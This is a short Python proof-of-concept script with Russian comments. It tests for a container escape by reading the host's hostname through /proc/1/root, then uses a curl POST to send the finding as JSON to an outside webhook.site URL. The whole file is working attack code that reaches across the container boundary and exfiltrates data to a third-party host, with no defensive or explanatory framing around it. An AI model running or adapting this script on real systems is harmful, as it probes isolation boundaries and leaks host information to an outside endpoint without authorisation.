import os
import subprocess
import json

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def prove_host_leak():
    evidence = {
        "VULN": "CONTAINER_ESCAPE_PROC_ROOT",
        "FILES_FOUND": []
    }
    
    # Пытаемся прочитать что-то специфичное для хоста через утечку
    leak_path = "/proc/1/root/etc/hostname"
    try:
        if os.path.exists(leak_path):
            with open(leak_path, "r") as f:
                host_identity = f.read().strip()
                evidence["FILES_FOUND"].append(f"HOST_NAME: {host_identity}")
    except Exception as e:
        evidence["ERROR"] = str(e)

    # Отправляем доказательство побега
    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json', 
        '-d', json.dumps(evidence), 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    prove_host_leak()
